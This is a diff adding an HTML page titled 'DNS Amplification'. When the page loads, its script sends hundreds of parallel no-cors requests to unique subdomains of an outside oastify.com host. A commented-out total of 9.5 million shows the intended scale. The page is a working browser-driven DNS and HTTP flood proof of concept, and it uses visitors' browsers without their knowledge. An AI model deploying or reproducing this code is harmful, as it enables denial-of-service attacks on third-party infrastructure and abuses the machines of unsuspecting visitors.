@@ -1,0 +1,90 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> DNS Amplification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .status {
+            margin: 10px 0;
+            white-space: pre-wrap; /* Preserve whitespace and line breaks in response data */
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1> DNS Amplification</h1>
+    <div id="statusContainer"></div>
+
+    <script>
+        const schema = 'https://';
+        const baseURL = '.jl8lv5w6601pacywkixdp7be359xxnlc.oastify.com';
+        const statusContainer = document.getElementById('statusContainer');
+     
+        
+        function checkPort(num) {
+            return fetch(schema + num + baseURL, { mode: 'no-cors' })
+                .then(response => {
+                    const statusCode = response.status;
+                    const statusMessage = schema + num + baseURL;
+                    return statusMessage;
+                })
+                .catch(error => {
+                    const statusCode = 'Error';
+                    const errorMessage = `${error.message}`;
+                    console.error(errorMessage);
+                    return errorMessage;
+                });
+        }
+
+        
+        function updateStatus(startnum, endnum) {
+            let requests = [];
+            
+            for (let num = startnum; num <= endnum; num++) {
+                requests.push(checkPort(num));
+            }
+
+            Promise.all(requests).then(results => {
+                results.forEach(result => {
+                    const div = document.createElement('div');
+                    div.className = 'status';
+                    div.textContent = result;
+                    if (result.includes('status-Error')) {
+                        div.classList.add('error');
+                    }
+                    statusContainer.appendChild(div);
+                });
+            });
+        }
+
+        // Function to start multiple parallel updates
+        function startParallelUpdates() {
+        //    const totalnum = 9500000;
+           const totalnum = 50;
+            const numInstances = 5; // Number of parallel instances
+            const PerInstance = Math.ceil(totalnum / numInstances);
+            
+            for (let i = 0; i < numInstances; i++) {
+                const startnum = i * PerInstance + 1;
+                const endnum = Math.min((i + 1) * PerInstance, totalnum);
+                
+                updateStatus(startnum, endnum); // Call without delay
+            }
+        }
+
+        // Start parallel updates
+        startParallelUpdates();
+        startParallelUpdates();
+        startParallelUpdates();
+        startParallelUpdates();
+        startParallelUpdates();
+    </script>
+</body>
+</html>
